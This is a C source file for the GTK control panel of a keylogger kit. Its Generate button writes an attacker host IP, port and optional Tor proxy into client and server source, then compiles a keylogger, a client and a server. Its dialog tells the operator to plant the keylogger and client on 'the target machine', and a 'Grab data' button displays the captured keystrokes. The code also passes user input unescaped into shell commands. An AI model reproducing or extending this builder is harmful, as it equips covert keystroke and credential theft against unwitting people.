#include <gtk/gtk.h>
#include <gdk/gdkscreen.h>
#include <cairo.h>
#include <gdk-pixbuf/gdk-pixbuf.h>
#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <errno.h>

GtkWidget *view;
GtkTextBuffer *buffer;
GtkWidget *widgets[20];
GtkWidget* scrolledwindow;
GtkEntryBuffer *buff1,*buff2,*buff3,*buff4;

typedef struct entries{
	GtkWidget *entry1;
	GtkWidget *entry2;
	GtkWidget *entry3;
	GtkWidget *entry4;
}ent;

int is_numeric(char *ch){
	for(int i = 0 ; i<strlen(ch) ; i++){
		if(ch[i] < 48 || ch[i] > 57)
			return 0;
	}
	return 1;
}

int check_ip(char *ip){
	int nb = 0;
	int x = strlen(ip);
	for(int i = 0 ; i < x ; i++){
		if(ip[i] == '.' || (ip[i] >= 48 && ip[i] <= 57 )){
			nb = nb + 1;
		}
	}
	return nb == x;
}
// this is the callback function when generate button is pressed.
static void generate_callback(GtkWidget *widget, ent *entry_list){
	gchar *host_ip, *host_port, *tor_ip, *tor_port;
	char command[500];
	memset(command, 0,500);
	int use_tor = 1;
	host_ip = gtk_entry_get_text(widgets[1]);// gtk_entry_buffer_get_text(gtk_entry_get_buffer(GTK_ENTRY(entry_list->entry1)));
	host_port = gtk_entry_get_text(widgets[3]);// gtk_entry_buffer_get_text(gtk_entry_get_buffer(GTK_ENTRY(entry_list->entry2)));
	tor_ip = gtk_entry_get_text(widgets[5]);//gtk_entry_buffer_get_text(gtk_entry_get_buffer(GTK_ENTRY(entry_list->entry3)));
	tor_port = gtk_entry_get_text(widgets[7]);//gtk_entry_buffer_get_text(gtk_entry_get_buffer(GTK_ENTRY(entry_list->entry4)));
	if((strlen(host_ip) == 0) || (strlen(host_port) == 0)){
		g_print("Please insert host IP and PORT");
		return;
	}
	if(strlen(tor_ip) == 0 || (strlen(tor_port) == 0)){
		g_print("[+] Tor option is ignored.\n");
		use_tor = 0;
	}
	if(!is_numeric(host_port)){
		g_print("[-] Please check the port number it must be numeric only.\n");
		return;
	}
	// Compile the server file
	sprintf(command, "sed -i s/port_here/%s/g Server/tmp.c",host_port);
	system("cp Server/main.c Server/tmp.c");
	system(command);
	DIR *dir=opendir("dist-bin");
	if(dir){
		closedir(dir);
	}else if(ENOENT == errno){
		system("mkdir dist-bin");
	}
	system("gcc Server/tmp.c -o dist-bin/server");
	system("rm Server/tmp.c");

	// Compile keylogger
	system("gcc Keylogger/*.c -o dist-bin/keylogger");

	// Compile the client file
	system("cp Client/main.c Client/tmp.c");
	memset(command, 0,500);
	if(!check_ip(host_ip)){
		g_print("[-] Please check the host ip address\n");
		return ;
	}
	// Set the port of the remote host in source code
	sprintf(command, "sed -i s/host_port_here/%s/g Client/tmp.c",host_port);
	system(command);
	memset(command, 0,500);
	
	// Set the ip of the remote host in the source code
	sprintf(command, "sed -i s/host_ip_here/%s/g Client/tmp.c",host_ip);
	system(command);
	memset(command, 0,500);

	if(use_tor){
		// Set TOR MACRO in source code
		sprintf(command, "sed -i s/tor_here/%s/g Client/tmp.c","MACRO");
		system(command);
		memset(command, 0,500);


		if(check_ip(tor_ip)){
			// Set the ip of the TOR proxy in the source code
			sprintf(command, "sed -i s/tor_ip_here/%s/g Client/tmp.c",tor_ip);
			system(command);
			memset(command, 0,500);
		}else{
			g_print("[-] Chech TOR ip\n");
			return ;
		}
		
		if(is_numeric(tor_port)){
			// Set the port of the TOR proxy in the source code
			sprintf(command, "sed -i s/tor_port_here/%s/g Client/tmp.c",tor_port);
			system(command);
			memset(command, 0,500);
		}else{
			g_print("[-] Check TOR port\n");
			return;
		}
	}
	system("gcc Client/tmp.c -o dist-bin/client");
	system("rm Client/tmp.c");
	GtkWidget *dialog = gtk_about_dialog_new();
	gtk_about_dialog_set_name(GTK_ABOUT_DIALOG(dialog), "");
	gtk_about_dialog_set_version(GTK_ABOUT_DIALOG(dialog), ""); 
	gtk_about_dialog_set_comments(GTK_ABOUT_DIALOG(dialog), "Files created successfully.\nPlease use the keylogger and client binaries on the target machine.\nUse server binary on the local host to grab data from the target.\n");
	gtk_dialog_run(GTK_DIALOG (dialog));
	gtk_widget_destroy(dialog);
}


// this is the callback function when grab data button is pressed.
static void grab_data_callback(GtkWidget *widget, gpointer data){
	FILE *f;
	int size;
	char * content = NULL;
	int fd;
	f = fopen("/rec.txt","r");
	if(!f){
		g_print("Error while opening file");
		return ;
	}
	fseek(f, 0L, SEEK_END);
	size = ftell(f);
	fclose(f);
	content = (char *)malloc(size + 1);
	fd = open("/rec.txt",0,0);
	read(fd,content,size);
	gtk_text_buffer_set_text (buffer, content, -1);
	free(content);
}

// this is the callback function when Info button is pressed.
static void info_callback(GtkWidget *widget, gpointer data){
	GtkWidget *dialog = gtk_about_dialog_new();
	gtk_about_dialog_set_name(GTK_ABOUT_DIALOG(dialog), "KEYLOGGER");
	gtk_about_dialog_set_version(GTK_ABOUT_DIALOG(dialog), "0.1"); 
	gtk_about_dialog_set_comments(GTK_ABOUT_DIALOG(dialog), "This is the first version of this keylogger.\nUse the generate button to generate the files to upload on the target host.\nUse the grap data button to display the data gathered from the remote target.");
	gtk_dialog_run(GTK_DIALOG (dialog));
	gtk_widget_destroy(dialog);
}



int main(int argc, char *argv[]) {	
	view = gtk_text_view_new ();
	buffer = gtk_text_view_get_buffer (GTK_TEXT_VIEW (view));
	gtk_text_buffer_set_text (buffer, "", -1);
	buff1 = gtk_entry_buffer_new("",-1);
	buff2 = gtk_entry_buffer_new("",-1);
	buff3 = gtk_entry_buffer_new("",-1);
	buff4 = gtk_entry_buffer_new("",-1);

	widgets[0] = gtk_label_new ("HOST IP:");
	widgets[1] = gtk_entry_new_with_buffer (buff1);
	widgets[2] = gtk_label_new ("HOST PORT:");
	widgets[3] = gtk_entry_new_with_buffer (buff2);
	widgets[4] = gtk_label_new ("TOR IP:");
	widgets[5] = gtk_entry_new_with_buffer (buff3);
	widgets[6] = gtk_label_new ("TOR PORT:");
	widgets[7] = gtk_entry_new_with_buffer (buff4);
	widgets[8] = gtk_button_new_with_label ("Generate");
	widgets[9] = gtk_button_new_with_label ("Grab data");
	widgets[10] = gtk_button_new_with_label ("Quit");
	widgets[11] = gtk_button_new_with_label ("Info");
	ent w;
	w.entry1 = widgets[1];
	w.entry2 = widgets[3];
	w.entry3 = widgets[5];
	w.entry4 = widgets[7];
	g_signal_connect(widgets[8], "clicked", G_CALLBACK(generate_callback), &w);
	g_signal_connect(widgets[9], "clicked", G_CALLBACK(grab_data_callback), NULL);
	g_signal_connect(widgets[10], "clicked", G_CALLBACK(gtk_main_quit), NULL);
	g_signal_connect(widgets[11], "clicked", G_CALLBACK(info_callback), NULL);

	GtkWidget *window;
	gtk_init(&argc, &argv);
	window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
	gtk_window_set_title(GTK_WINDOW(window), "Keylogger");
	gtk_window_set_default_size(GTK_WINDOW(window), 500, 500);
	gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
	GtkWidget *table = gtk_table_new (4, 4 , TRUE);
	gtk_table_set_homogeneous(GTK_TABLE (table), TRUE);
	int pos = 0;
	for(int i = 0 ; i<3 ; i++){
		for(int j = 0 ; j<4 ; j++){
			gtk_table_attach_defaults (GTK_TABLE (table), widgets[pos], j, j+1, i, i+1);
			pos++;
		}
	}
	scrolledwindow = gtk_scrolled_window_new(NULL, NULL);
	gtk_container_add(GTK_CONTAINER(scrolledwindow), view);
	gtk_table_attach_defaults (GTK_TABLE (table), scrolledwindow, 0, 4, 3, 4);

	gtk_container_add (GTK_CONTAINER (window), table);

	g_signal_connect(window, "destroy",
	G_CALLBACK(gtk_main_quit), NULL);
	gtk_widget_show_all(window);
	gtk_main();

  return 0;
}
